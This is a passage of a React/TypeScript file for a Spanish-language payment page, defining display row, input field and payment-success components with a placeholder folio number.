      <p className="text-xs text-muted-foreground">
        El pago puede tardar hasta 24 horas en reflejarse. Conserve su comprobante.
      </p>
    </div>
  );
}

function Row({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex items-center justify-between border-b border-border pb-2">
      <span className="text-muted-foreground">{label}</span>
      <span className="font-mono font-semibold">{value}</span>
    </div>
  );
}

function Field({ label, placeholder }: { label: string; placeholder: string }) {
  return (
    <div>
      <label className="text-sm font-medium block mb-1.5">{label}</label>
      <input
        placeholder={placeholder}
        className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2.5 focus:outline-none focus:ring-2 focus:ring-[var(--burgundy)]"
      />
    </div>
  );
}

function PaymentSuccess({ method, total }: { method: string; total: number }) {
  return (
    <div className="bg-card rounded-xl border border-border shadow-sm p-8 text-center">
      <div className="mx-auto h-16 w-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mb-4">
        <CheckCircle2 className="h-8 w-8" />
      </div>
      <h2 className="text-2xl font-bold">Pago Exitoso</h2>
      <p className="text-muted-foreground mt-2">
        Su pago de {fmt(total)} con {method} ha sido procesado correctamente.
      </p>
      <p className="text-sm text-muted-foreground mt-4">
        Folio: <span className="font-mono font-semibold">ABC1234L4N</span>
      </p>
    </div>
  );
}

export default Index;
